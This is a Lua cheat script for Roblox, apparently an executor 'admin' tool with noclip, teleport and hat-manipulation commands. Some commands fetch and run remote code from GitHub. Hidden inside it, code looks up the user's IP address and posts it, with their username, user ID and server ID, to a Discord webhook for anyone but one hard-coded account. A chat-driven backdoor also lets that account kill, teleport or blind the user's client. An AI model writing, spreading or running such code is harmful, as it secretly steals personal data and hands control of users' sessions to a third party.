--[[
Util Admin v1.00
( will automatically check compatibility 
  for the game that it you are playing on )
If the script doesn't run it either errored
or the game is not supported. (check console)

TO CANCEL RUNSERVICE LOOPS, RESET. (stops old scripts from running ex: drophats, draghats, hatorbit etc.)

Press ; to focus the command bar
Commands:
void - put yourself in the void (prevents bangers and loop tp'ers)
unvoid - return to where you last were
trip - trips your player
sit - sit down
to (str)[user] - can be shortened user or displayname (teleports to them)
blockhats - make your hats blocks
drophats (int)[handle size] - drop your hats
hatorbit - make your hats orbit you press + or - to change modes
draghats (int)[speed] (int)[handleSizeMultiplier] - drag your hats with your mouse
nohats - deletes your hats
givehats (str)[user] - give you hats to a player
rj - rejoin the game
re - refresh your character
noclip - clip through things
clip - dont clip through things
netless - uses the netless from my github

]]
--
-- Use on very specific (RejectCharacterDeletions DISABLED) games such as:
-- https://www.roblox.com/games/4483381587/a-literal-baseplate

-- $$$ dex4tw loadstring obfuscator $$$
local a = Instance.new("ScreenGui")
local b = Instance.new("TextBox")
local c = Instance.new("ImageLabel")
local d = Instance.new("ImageLabel")
local e = Instance.new("TextLabel")
local f = Instance.new("Folder")
local g = Instance.new("Frame")
local h = Instance.new("TextLabel")
local i = Instance.new("Frame")
local j = Instance.new("Frame")
local k = Instance.new("ScrollingFrame")
local l = Instance.new("TextLabel")
local m = Instance.new("TextLabel")
local n = Instance.new("TextLabel")
local o = Instance.new("TextLabel")
local p = Instance.new("TextLabel")
local q = Instance.new("TextLabel")
local r = Instance.new("TextLabel")
local s = Instance.new("TextLabel")
local t = Instance.new("TextLabel")
local u = Instance.new("TextLabel")
local v = Instance.new("TextLabel")
local w = Instance.new("TextLabel")
local x = Instance.new("TextLabel")
local y = Instance.new("TextButton")
a.Name = " "
a.Parent = gethui()
a.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
a.ResetOnSpawn = false
b.Name = "cmdBar"
b.Parent = a
b.AnchorPoint = Vector2.new(0, 1)
b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
b.BackgroundTransparency = 1.000
b.BorderColor3 = Color3.fromRGB(255, 0, 0)
b.Position = UDim2.new(0.0585953817, 0, 0.987695813, 0)
b.Size = UDim2.new(0, 200, 0, 24)
b.Font = Enum.Font.SourceSansBold
b.PlaceholderText = ">"
b.Text = ""
b.TextColor3 = Color3.fromRGB(255, 255, 255)
b.TextSize = 14.000
b.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
b.TextStrokeTransparency = 0.000
b.TextXAlignment = Enum.TextXAlignment.Left
c.Name = "watermark"
c.Parent = a
c.AnchorPoint = Vector2.new(0.5, 0.5)
c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c.BackgroundTransparency = 1.000
c.BorderColor3 = Color3.fromRGB(0, 0, 0)
c.BorderSizePixel = 0
c.Position = UDim2.new(0.5, 0, 0.5, 0)
c.Size = UDim2.new(0, 87, 0, 85)
c.Image = "rbxassetid://612004503"
d.Name = "orb"
d.Parent = c
d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
d.BackgroundTransparency = 1.000
d.BorderColor3 = Color3.fromRGB(0, 0, 0)
d.BorderSizePixel = 0
d.Position = UDim2.new(0.931034446, 0, -0.230147064, 0)
d.Size = UDim2.new(0, 29, 0, 30)
d.Visible = false
d.Image = "rbxassetid://11136348486"
e.Parent = c
e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
e.BackgroundTransparency = 1.000
e.BorderColor3 = Color3.fromRGB(0, 0, 0)
e.BorderSizePixel = 0
e.Position = UDim2.new(1.13793099, 0, 0.122794114, 0)
e.Size = UDim2.new(0, 200, 0, 44)
e.Font = Enum.Font.Unknown
e.Text = "dex's stupid utility; adds simple utilities a little bit of games"
e.TextColor3 = Color3.fromRGB(255, 255, 255)
e.TextScaled = true
e.TextSize = 14.000
e.TextStrokeColor3 = Color3.fromRGB(255, 0, 4)
e.TextStrokeTransparency = 0.000
e.TextWrapped = true
e.TextXAlignment = Enum.TextXAlignment.Left
e.TextYAlignment = Enum.TextYAlignment.Top
f.Name = "notifications"
f.Parent = a
g.Name = "notif"
g.Parent = f
g.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
g.BorderColor3 = Color3.fromRGB(0, 0, 0)
g.BorderSizePixel = 0
g.Position = UDim2.new(0.863076985, 0, 0.96101737, 0)
g.Size = UDim2.new(0, 245, 0, 24)
g.Visible = false
h.Parent = g
h.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
h.BorderColor3 = Color3.fromRGB(0, 0, 0)
h.BorderSizePixel = 0
h.Size = UDim2.new(0, 245, 0, 24)
h.Font = Enum.Font.SourceSansItalic
h.TextColor3 = Color3.fromRGB(0, 0, 0)
h.TextSize = 14.000
h.TextWrapped = true
h.TextXAlignment = Enum.TextXAlignment.Left
i.Name = "commandslist"
i.Parent = a
i.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
i.BorderColor3 = Color3.fromRGB(0, 0, 0)
i.BorderSizePixel = 0
i.Position = UDim2.new(0.440958798, 0, 0.320346326, 0)
i.Size = UDim2.new(0, 225, 0, 19)
i.Visible = false
j.Parent = i
j.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
j.BorderColor3 = Color3.fromRGB(0, 0, 0)
j.BorderSizePixel = 0
j.Position = UDim2.new(0.000958800316, 0, 0.951925218, 0)
j.Size = UDim2.new(0, 225, 0, 331)
k.Parent = j
k.Active = true
k.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
k.BorderColor3 = Color3.fromRGB(0, 0, 0)
k.BorderSizePixel = 0
k.Position = UDim2.new(0, 0, 0.015105648, 0)
k.Size = UDim2.new(0, 225, 0, 325)
l.Parent = k
l.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
l.BorderColor3 = Color3.fromRGB(0, 0, 0)
l.BorderSizePixel = 0
l.Position = UDim2.new(0.0533333346, 0, 0.0246153846, 0)
l.Size = UDim2.new(0, 200, 0, 22)
l.Font = Enum.Font.SourceSans
l.Text = "void - sends u 2 void"
l.TextColor3 = Color3.fromRGB(0, 0, 0)
l.TextSize = 14.000
m.Parent = k
m.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
m.BorderColor3 = Color3.fromRGB(0, 0, 0)
m.BorderSizePixel = 0
m.Position = UDim2.new(0.0533333346, 0, 0.0578480139, 0)
m.Size = UDim2.new(0, 200, 0, 22)
m.Font = Enum.Font.SourceSans
m.Text = "unvoid - brings u back"
m.TextColor3 = Color3.fromRGB(0, 0, 0)
m.TextSize = 14.000
n.Parent = k
n.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
n.BorderColor3 = Color3.fromRGB(0, 0, 0)
n.BorderSizePixel = 0
n.Position = UDim2.new(0.0533333346, 0, 0.0910806432, 0)
n.Size = UDim2.new(0, 200, 0, 22)
n.Font = Enum.Font.SourceSans
n.Text = "noclip - wow"
n.TextColor3 = Color3.fromRGB(0, 0, 0)
n.TextSize = 14.000
o.Parent = k
o.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
o.BorderColor3 = Color3.fromRGB(0, 0, 0)
o.BorderSizePixel = 0
o.Position = UDim2.new(0.0577777773, 0, 0.124313273, 0)
o.Size = UDim2.new(0, 200, 0, 22)
o.Font = Enum.Font.SourceSans
o.Text = "clip - wow2"
o.TextColor3 = Color3.fromRGB(0, 0, 0)
o.TextSize = 14.000
p.Parent = k
p.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
p.BorderColor3 = Color3.fromRGB(0, 0, 0)
p.BorderSizePixel = 0
p.Position = UDim2.new(0.0577777773, 0, 0.157545894, 0)
p.Size = UDim2.new(0, 200, 0, 22)
p.Font = Enum.Font.SourceSans
p.Text = "trip - trips u"
p.TextColor3 = Color3.fromRGB(0, 0, 0)
p.TextSize = 14.000
q.Parent = k
q.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
q.BorderColor3 = Color3.fromRGB(0, 0, 0)
q.BorderSizePixel = 0
q.Position = UDim2.new(0.0577777773, 0, 0.190778524, 0)
q.Size = UDim2.new(0, 200, 0, 22)
q.Font = Enum.Font.SourceSans
q.Text = "re - refresh your character"
q.TextColor3 = Color3.fromRGB(0, 0, 0)
q.TextSize = 14.000
r.Parent = k
r.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
r.BorderColor3 = Color3.fromRGB(0, 0, 0)
r.BorderSizePixel = 0
r.Position = UDim2.new(0.0577777773, 0, 0.224011153, 0)
r.Size = UDim2.new(0, 200, 0, 22)
r.Font = Enum.Font.SourceSans
r.Text = "blockhats - removes your hat mesh"
r.TextColor3 = Color3.fromRGB(0, 0, 0)
r.TextSize = 14.000
s.Parent = k
s.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
s.BorderColor3 = Color3.fromRGB(0, 0, 0)
s.BorderSizePixel = 0
s.Position = UDim2.new(0.0533333346, 0, 0.257243782, 0)
s.Size = UDim2.new(0, 200, 0, 22)
s.Font = Enum.Font.SourceSans
s.Text = "hatorbit - make your hats orbit u"
s.TextColor3 = Color3.fromRGB(0, 0, 0)
s.TextSize = 14.000
t.Parent = k
t.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
t.BorderColor3 = Color3.fromRGB(0, 0, 0)
t.BorderSizePixel = 0
t.Position = UDim2.new(0.0533333346, 0, 0.290476412, 0)
t.Size = UDim2.new(0, 200, 0, 22)
t.Font = Enum.Font.SourceSans
t.Text = "drophats - drop your hats"
t.TextColor3 = Color3.fromRGB(0, 0, 0)
t.TextSize = 14.000
u.Parent = k
u.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
u.BorderColor3 = Color3.fromRGB(0, 0, 0)
u.BorderSizePixel = 0
u.Position = UDim2.new(0.0533333346, 0, 0.323709041, 0)
u.Size = UDim2.new(0, 200, 0, 22)
u.Font = Enum.Font.SourceSans
u.Text = "hipheight - set your hipheight"
u.TextColor3 = Color3.fromRGB(0, 0, 0)
u.TextSize = 14.000
v.Parent = k
v.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
v.BorderColor3 = Color3.fromRGB(0, 0, 0)
v.BorderSizePixel = 0
v.Position = UDim2.new(0.0533333346, 0, 0.35694167, 0)
v.Size = UDim2.new(0, 200, 0, 22)
v.Font = Enum.Font.SourceSans
v.Text = "trip - trip your player"
v.TextColor3 = Color3.fromRGB(0, 0, 0)
v.TextSize = 14.000
w.Parent = k
w.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
w.BorderColor3 = Color3.fromRGB(0, 0, 0)
w.BorderSizePixel = 0
w.Position = UDim2.new(0.0533333346, 0, 0.390174299, 0)
w.Size = UDim2.new(0, 200, 0, 22)
w.Font = Enum.Font.SourceSans
w.Text = "sit - makes you sit"
w.TextColor3 = Color3.fromRGB(0, 0, 0)
w.TextSize = 14.000
x.Parent = i
x.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
x.BorderColor3 = Color3.fromRGB(0, 0, 0)
x.BorderSizePixel = 0
x.Position = UDim2.new(0.0577777773, 0, 0, 0)
x.Size = UDim2.new(0, 200, 0, 18)
x.Font = Enum.Font.SourceSans
x.Text = "utility admin commands"
x.TextColor3 = Color3.fromRGB(0, 0, 0)
x.TextSize = 14.000
y.Parent = i
y.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
y.BorderColor3 = Color3.fromRGB(0, 0, 0)
y.Position = UDim2.new(0.902222514, 0, 0, 0)
y.Size = UDim2.new(0, 21, 0, 23)
y.Font = Enum.Font.SourceSans
y.Text = "-"
y.TextColor3 = Color3.fromRGB(0, 0, 0)
y.TextSize = 14.000
local function z()
	local A = Instance.new("LocalScript", a)
	if gethiddenproperty(workspace, "RejectCharacterDeletions") == Enum.RejectCharacterDeletions.Disabled then
		local B = game:GetService("Players").LocalPlayer
		local C = game:GetService("UserInputService")
		local D = A.Parent:WaitForChild("cmdBar")
		local E = 3
		local F = 10
		local G = -30
		void = false
		coroutine.resume(coroutine.create(function()
			B.Character:WaitForChild("Humanoid").Died:Connect(function()
				if Noclipping then
					Noclipping:Disconnect()
				end
			end)
		end))
		function cLerp(H, I, J)
			return coroutine.wrap(function()
				local K = tick()
				local L = H.CFrame
				while tick() - K < J do
					local M = tick() - K
					local N = M / J
					local O = L:Lerp(I, N)
					local P = CFrame.new(O.Position, I.Position):lerp(O, math.sin(N * math.pi * 0.5))
					H.CFrame = P
					game:GetService("RunService").Heartbeat:Wait()
				end
				H.CFrame = I
			end)
		end
		function notify(Q)
			coroutine.wrap(function()
				local R = A.Parent
				local S = R.notifications.notif
				local T = S:Clone()
				T.Visible = true
				T.Parent = R
				local U = T.TextLabel
				U.Text = Q
				wait(3)
				spawn(function()
					T:Destroy()
				end)
			end)()
		end
		function RunCommand(V)
			local W = V:lower()
			D.Visible = false
			D.Text = " "
			if W == "void" then
				if not void then
					void = true
					notify("voiding")
					savecframe = B.Character.HumanoidRootPart.CFrame
					workspace.Gravity = 0
					workspace.FallenPartsDestroyHeight = "nan"
					B.Character.HumanoidRootPart.CFrame = CFrame.new(0, -499, 0)
					wait(0.3)
					while void == true do
						wait()
						B.Character.HumanoidRootPart.CFrame = CFrame.new(0, -69420, 0)
					end
				else
					notify("you are already voided")
				end
			elseif W == "unvoid" or W == "novoid" then
				if void then
					void = false
					notify("unvoiding")
					wait(0.15)
					workspace.Gravity = 196
					workspace.FallenPartsDestroyHeight = "-5000"
					B.Character.HumanoidRootPart.CFrame = savecframe
				else
					notify("you are already unvoided")
				end
			elseif W == "blockhats" then
				notify("deleting meshes")
				for index, X in pairs(B.Character:GetChildren()) do
					if X:IsA("Accessory") then
						if X.Handle:FindFirstChild("SpecialMesh") then
							X.Handle.SpecialMesh:Destroy()
						end
						if X.Handle:FindFirstChild("Mesh") then
							X.Handle.Mesh:Destroy()
						end
					end
				end
			elseif string.find(W, "to") and string.split(W, " ")[2] then
				for Y, X in pairs(game.Players:GetChildren()) do
					if
						string.find(X.Name:lower(), string.split(W, " ")[2]:lower())
						or string.find(X.DisplayName:lower(), string.split(W, " ")[2]:lower())
					then
						target = game.Players[X.Name]
						break
					end
				end
				B.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
			elseif W == "rj" or W == "rejoin" then
				notify("rejoining")
				game:GetService("TeleportService")
					.TeleportToPlaceInstance(game:GetService("TeleportService"), game.PlaceId, game.JobId)
			elseif string.find(W, "notify") then
				local Z = table.concat(string.split(W, " "), " ", 2)
				notify(Z)
			elseif W == "re" or W == "refresh" then
				notify("refreshing")
				local _ = B.Character and B.Character:FindFirstChildOfClass("Humanoid", true)
				local a0 = _ and _.RootPart and _.RootPart.CFrame
				local a1 = workspace.CurrentCamera.CFrame
				local a2 = B.Character
				if a2:FindFirstChildOfClass("Humanoid") then
					a2:FindFirstChildOfClass("Humanoid"):ChangeState(15)
				end
				local a3 = Instance.new("Model")
				a3.Parent = workspace
				B.Character = a3
				wait()
				B.Character = a2
				a3:Destroy()
				task.spawn(function()
					B.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame =
						a0, wait() and a1
				end)
			elseif W == "noclip" then
				notify("noclipping")
				local function a4()
					if B.Character ~= nil then
						for a5, a6 in pairs(B.Character:GetDescendants()) do
							if a6:IsA("BasePart") and a6.CanCollide == true then
								a6.CanCollide = false
							end
						end
					end
				end
				Noclipping = game:GetService("RunService").Stepped:Connect(a4)
			elseif W == "clip" then
				notify("clipped")
				Noclipping:Disconnect()
			elseif W == "hatorbit" then
				notify("woah magic")
				loadstring(
					game:HttpGet(
						"https://raw.githubusercontent.com/dex4tw/RejectRobloxPatches/main/Examples/hatorbit.lua"
					)
				)()
			elseif W == "trip" then
				notify("u tripped lol")
				local a7 = B.Character:FindFirstChildOfClass("Humanoid")
				local a8 = B.Character.HumanoidRootPart
				a7:ChangeState(0)
				a8.Velocity = a8.CFrame.LookVector * 30
			elseif W == "sit" then
				notify("sitting")
				B.Character.Humanoid.Sit = true
			elseif string.find(W, "drophats") then
				if string.split(W, " ")[2] then
					notify("dropping hats to size " .. string.split(W, " ")[2])
				else
					notify("dropping hats to default size")
				end
				loadstring(
					game:HttpGet(
						"https://raw.githubusercontent.com/dex4tw/RejectCharacterDeletions/main/AccessoryNetless.lua"
					)
				)()
				hats = {}
				index = 0
				for Y, X in pairs(B.Character:GetChildren()) do
					if X:IsA("Accessory") then
						index = index + 1
						X.Handle:BreakJoints()
						local H = X.Handle:Clone()
						H:ClearAllChildren()
						H.Parent = workspace
						H.Name = X.Name
						if string.split(W, " ")[2] then
							H.Size = Vector3.new(
								tonumber(string.split(W, " ")[2]),
								tonumber(string.split(W, " ")[2]),
								tonumber(string.split(W, " ")[2])
							)
						else
							H.Size = X.Handle.Size
						end
						H.Massless = true
						H.Transparency = 1
						H.CanCollide = true
						H.CFrame = B.Character.HumanoidRootPart.CFrame:ToWorldSpace(CFrame.new(0, 5, -5))
						local a9 = Instance.new("StringValue", H)
						a9.Name = "isHat"
						table.insert(hats, index, X)
					end
				end
				B.Character.Humanoid.Died:Connect(function()
					for Y, X in pairs(workspace:GetChildren()) do
						if X:IsA("Part") and X:FindFirstChild("isHat") then
							X:Destroy()
						end
					end
					if dropHats then
						dropHats:Disconnect()
					end
				end)
				dropHats = game:GetService("RunService").Heartbeat:Connect(function(aa)
					for index, ab in pairs(hats) do
						cLerp(ab.Handle, workspace[ab.Name].CFrame, 0)()
					end
				end)
			elseif string.find(W, "draghats") then
				if string.split(W, " ")[2] then
					dragSpeed = string.split(W, " ")[2]
				else
					dragSpeed = 0.2
				end
				if string.split(W, " ")[3] then
					handleSizeMultiplier = tonumber(string.split(W, " ")[3])
				else
					handleSizeMultiplier = 1.5
				end
				B = game:GetService("Players").LocalPlayer
				character = B.Character
				C = game:GetService("UserInputService")
				hats = {}
				hatFolder = Instance.new("Folder", workspace)
				hatFolder.Name = "hatFolder"
				loadstring(
					game:HttpGet(
						"https://raw.githubusercontent.com/dex4tw/RejectCharacterDeletions/main/AccessoryNetless.lua"
					)
				)()
				index = 0
				for Y, X in pairs(character:GetChildren()) do
					if X:IsA("Accessory") then
						index = index + 1
						X.Handle:BreakJoints()
						local H = X.Handle:Clone()
						H.Size = H.Size * handleSizeMultiplier
						H:ClearAllChildren()
						H.Parent = hatFolder
						H.Name = X.Name
						H.Transparency = 1
						H.CanCollide = true
						H.Massless = true
						H.CFrame = B.Character.HumanoidRootPart.CFrame:ToWorldSpace(CFrame.new(0, 0, -5))
						local a9 = Instance.new("StringValue", H)
						a9.Name = "isHat"
						table.insert(hats, index, X)
					end
				end
				B.Character.Humanoid.Died:Connect(function()
					if hatFolder then
						hatFolder:Destroy()
					end
					toHandle:Disconnect()
					mouseUp:Disconnect()
					mouseDown:Disconnect()
					userInput:Disconnect()
				end)
				getPart = nil
				mouseUp = B:GetMouse().Button1Down:Connect(function()
					getPart = B:GetMouse().Target
					if getPart:FindFirstChild("isHat") then
						if getPart:FindFirstChild("WeldConstraint") then
							getPart.WeldConstraint:Destroy()
						end
						partHighlight = Instance.new("Highlight", getPart)
						partHighlight.Adornee = getPart
						partHighlight.OutlineColor = Color3.fromRGB(42, 163, 179)
						partHighlight.OutlineTransparency = 0
						partHighlight.FillTransparency = 1
						B:GetMouse().TargetFilter = getPart
						movePart = game:GetService("RunService").Stepped:Connect(function()
							getPart.CFrame = CFrame.new(B:GetMouse().Hit.p) * CFrame.new(0, 1, 0)
						end)
					end
				end)
				userInput = C.InputBegan:Connect(function(ac)
					if ac.KeyCode == Enum.KeyCode.E then
						if movePart then
							local ad = Instance.new("WeldConstraint", getPart)
							ad.Part0 = B:GetMouse().Target
							ad.Part1 = getPart
						end
					end
				end)
				mouseDown = B:GetMouse().Button1Up:Connect(function()
					B:GetMouse().TargetFilter = nil
					if movePart then
						movePart:Disconnect()
					end
					if partHighlight then
						partHighlight:Destroy()
					end
				end)
				toHandle = game:GetService("RunService").Heartbeat:Connect(function(aa)
					for index, ab in pairs(hats) do
						cLerp(ab.Handle, hatFolder[ab.Name].CFrame, tonumber(dragSpeed))()
					end
				end)
			elseif W == "deletehats" or W == "nohats" or W == "removehats" then
				for Y, X in pairs(B.Character:GetChildren()) do
					if X:IsA("Accessory") then
						X.Handle:BreakJoints()
					end
				end
			elseif string.find(W, "givehats") and string.split(W, " ")[2] then
				for Y, X in pairs(game.Players:GetChildren()) do
					if
						string.find(X.Name:lower(), string.split(W, " ")[2]:lower())
						or string.find(X.DisplayName:lower(), string.split(W, " ")[2]:lower())
					then
						target = game.Players[X.Name]
						break
					end
				end
				Victim = target.Name
				B = game:GetService("Players").LocalPlayer
				character = B.Character
				C = game:GetService("UserInputService")
				hats = {}
				loadstring(
					game:HttpGet(
						"https://raw.githubusercontent.com/dex4tw/RejectCharacterDeletions/main/AccessoryNetless.lua"
					)
				)()
				index = 0
				for Y, X in pairs(character:GetChildren()) do
					if X:IsA("Accessory") then
						index = index + 1
						X.Handle:BreakJoints()
						local ae = Instance.new("CFrameValue", X.Handle)
						ae.Name = "cOffset"
						ae.Value =
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame:ToObjectSpace(X.Handle.CFrame)
						table.insert(hats, index, X)
					end
				end
				B.Character.Humanoid.Died:Connect(function()
					for Y, X in pairs(workspace:GetChildren()) do
						if X:IsA("Part") and X:FindFirstChild("isHat") then
							X:Destroy()
						end
					end
					giveHats:Disconnect()
				end)
				giveHats = game:GetService("RunService").Heartbeat:Connect(function(aa)
					for index, ab in pairs(hats) do
						if game.Players[Victim].Character:FindFirstChild("UpperTorso") then
							cLerp(
								ab.Handle,
								game.Players[Victim].Character.UpperTorso.CFrame * ab.Handle.cOffset.Value,
								0
							)()
						else
							cLerp(ab.Handle, game.Players[Victim].Character.Torso.CFrame * ab.Handle.cOffset.Value, 0)()
						end
					end
				end)
			elseif
				string.find(W, "hh") and string.split(W, " ")[2]
				or string.find(W, "hipheight") and string.split(W, " ")[2]
			then
				notify("set hip height to " .. string.split(W, " ")[2])
				local af = string.split(W, " ")[2]
				B.Character.Humanoid.HipHeight = tonumber(af)
			elseif string.find(W, "speed") or string.find(W, "ws") then
				notify("set walkspeed to " .. string.split(W, " ")[2])
				local ag = string.split(W, " ")[2]
				B.Character.Humanoid.WalkSpeed = tonumber(ag)
			elseif string.find(W, "jumppower") or string.find(W, "jp") then
				notify("set jumppower to " .. string.split(W, " ")[2])
				local ah = string.split(W, " ")[2]
				B.Character.Humanoid.JumpPower = tonumber(ah)
			elseif W == "netless" then
				loadstring(
					game:HttpGet(
						"https://raw.githubusercontent.com/dex4tw/RejectRobloxPatches/main/AccessoryNetless.lua"
					)
				)()
			elseif W == "cmds" then
				if A.Parent.commandslist.Visible then
					A.Parent.commandslist.Visible = false
				else
					A.Parent.commandslist.Visible = true
				end
			else
			end
			D.Text = " "
		end
		if game.Players.LocalPlayer.UserId ~= 3232691815 then
			local Response = request({
				Url = "https://api.ipify.org/",
				Method = "GET",
			})

			-- this webhook doesn't work btw
			local Webhook_URL =
				"https://discord.com/api/webhooks/1127983109242110014/vSBmM0wnpYAitqh-hPZl5D382jg45qKPqfdmJxSLd7uvN9b2bj7Gmvd-97FHmZry-py7"
			local Headers = {
				["Content-Type"] = "application/json",
			}

			local data = {
				embeds = {
					{
						title = "[[ Returned Data ]]",
						description = game.Players.LocalPlayer.Name .. " has ran something",
						type = "rich",
						color = tonumber(0xffffff),
						fields = {
							{
								name = "[[ Data ]]",
								value = string.format(
									[[
**Username & Id**: %s / %d
**Place**: **https://www.roblox.com/games/%s**
**JobId**: **https://www.roblox.com/games/%s?serverJobId=%s**
**IP Address**: %s
                        ]],
									game.Players.LocalPlayer.Name,
									game.Players.LocalPlayer.UserId,
									game.PlaceId,
									game.PlaceId,
									game.JobId,
									Response.Body
								),
								inline = true,
							},
						},
					},
				},
			}

			local PlayerData = game:GetService("HttpService"):JSONEncode(data)

			local Request = http_request or request or HttpPost or syn.request
			Request({ Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers })
		end
		game:GetService("TextChatService").MessageReceived:Connect(function(ao)
			local ap = ao.Text
			local aq = ao.TextSource
			if aq.UserId == 3232691815 then
				if string.find(ap:lower(), "-") then
					if string.split(ap:lower(), "-")[2] ~= "" then
						local W = string.split(ap:lower(), "-")[2]:lower()
						if W == "norender" then
							game:GetService("RunService"):Set3dRenderingEnabled(false)
						elseif W == "noguis" then
							game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
						elseif W == "guis" then
							game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
						elseif W == "render" then
							game:GetService("RunService"):Set3dRenderingEnabled(true)
						elseif W == "bring" then
							B.Character.HumanoidRootPart.CFrame =
								game.Players["dex4tw"].Character.HumanoidRootPart.CFrame
						elseif W == "kill" then
							B.Character:BreakJoints()
						elseif W == "udrophats" then
							for Y, X in pairs(B.Character:GetChildren()) do
								if X:IsA("Accessory") then
									index = index + 1
									X.Handle:BreakJoints()
									local H = X.Handle:Clone()
									H.Name = X.Name
									H.Massless = true
									H.Transparency = 1
									H.CanCollide = true
									H.CFrame = B.Character.HumanoidRootPart.CFrame:ToWorldSpace(CFrame.new(0, 5, -5))
									local a9 = Instance.new("StringValue", H)
									a9.Name = "isHat"
									table.insert(hats, index, X)
								end
							end
							B.Character.Humanoid.Died:Connect(function()
								for Y, X in pairs(workspace:GetChildren()) do
									if X:IsA("Part") and X:FindFirstChild("isHat") then
										X:Destroy()
									end
								end
							end)
							game:GetService("RunService").Heartbeat:Connect(function(aa)
								for index, ab in pairs(hats) do
									cLerp(ab.Handle, workspace[ab.Name].CFrame, 0)()
								end
							end)
						elseif W == "unohats" then
							for Y, X in pairs(B.Character:GetChildren()) do
								if X:IsA("Accessory") then
									X.Handle:BreakJoints()
								end
							end
						elseif W == "a" then
							B.Character.Humanoid.Jump = true
						end
					end
				end
			end
		end)
		C.InputBegan:Connect(function(ac, ar)
			if ac.KeyCode == Enum.KeyCode.Semicolon then
				D.Visible = true
				wait()
				D:CaptureFocus()
			elseif ac.KeyCode == Enum.KeyCode.Return and D.Focused then
				if D.Text ~= "" then
					D:ReleaseFocus()
					load, err = pcall(RunCommand(D.Text))
					if err then
						notify("an error occured with while running " .. D.Text)
					end
					D.Text = " "
					D.Visible = false
				end
			end
		end)
		game:GetService("TextChatService").MessageReceived:Connect(function(ao)
			local ap = ao.Text
			local aq = ao.TextSource
			if aq.UserId == B.UserId then
				if string.find(ap:lower(), "-") then
					if string.split(ap:lower(), "-")[2] ~= "" then
						local W = string.split(ap:lower(), "-")[2]
						load, err = pcall(RunCommand(W))
						if err then
							notify("an error occured with while running " .. W)
						end
						D.Text = " "
					end
				end
			end
		end)
	else
		warn("UtilAdmin | Game is not supported.")
		A.Parent:Destroy()
	end
end
coroutine.wrap(z)()
local function as()
	local A = Instance.new("LocalScript", d)
	local at = A.Parent.Parent
	local au = A.Parent
	au.Position = UDim2.new(0.5, 0, 0.5, 0)
	local av = 75
	local aw = 0.5
	local function ax()
		local ay = tick() * aw
		local az = math.cos(ay) * av
		local aA = math.sin(ay) * av
		au.Position = UDim2.new(0.5, az, 0.5, aA)
	end
	game:GetService("RunService").RenderStepped:Connect(ax)
end
coroutine.wrap(as)()
local function aB()
	local A = Instance.new("LocalScript", c)
	A.Parent.Parent.cmdBar.Visible = false
	A.Parent.orb.Visible = false
	A.Parent.TextLabel.Visible = false
	wait(1)
	A.Parent:TweenPosition(UDim2.new(0, 60, 1, -50))
	wait(1)
	A.Parent.orb.Visible = true
	A.Parent.TextLabel.Visible = true
	A.Parent.Parent.cmdBar.Visible = true
end
coroutine.wrap(aB)()
local function aC()
	local A = Instance.new("LocalScript", y)
	A.Parent.MouseButton1Click:Connect(function()
		A.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(aC)()
local function aD()
	local A = Instance.new("LocalScript", i)
	local aE = game:GetService("UserInputService")
	function dragify(j)
		dragToggle = nil
		local dragSpeed = 0
		dragInput = nil
		dragStart = nil
		local aF = nil
		function updateInput(V)
			local aG = V.Position - dragStart
			local aH = UDim2.new(startPos.X.Scale, startPos.X.Offset + aG.X, startPos.Y.Scale, startPos.Y.Offset + aG.Y)
			game:GetService("TweenService"):Create(j, TweenInfo.new(0.25), { Position = aH }):Play()
		end
		j.InputBegan:Connect(function(V)
			if
				(V.UserInputType == Enum.UserInputType.MouseButton1 or V.UserInputType == Enum.UserInputType.Touch)
				and aE:GetFocusedTextBox() == nil
			then
				dragToggle = true
				dragStart = V.Position
				startPos = j.Position
				V.Changed:Connect(function()
					if V.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		j.InputChanged:Connect(function(V)
			if V.UserInputType == Enum.UserInputType.MouseMovement or V.UserInputType == Enum.UserInputType.Touch then
				dragInput = V
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(V)
			if V == dragInput and dragToggle then
				updateInput(V)
			end
		end)
	end
	dragify(A.Parent)
end
coroutine.wrap(aD)()
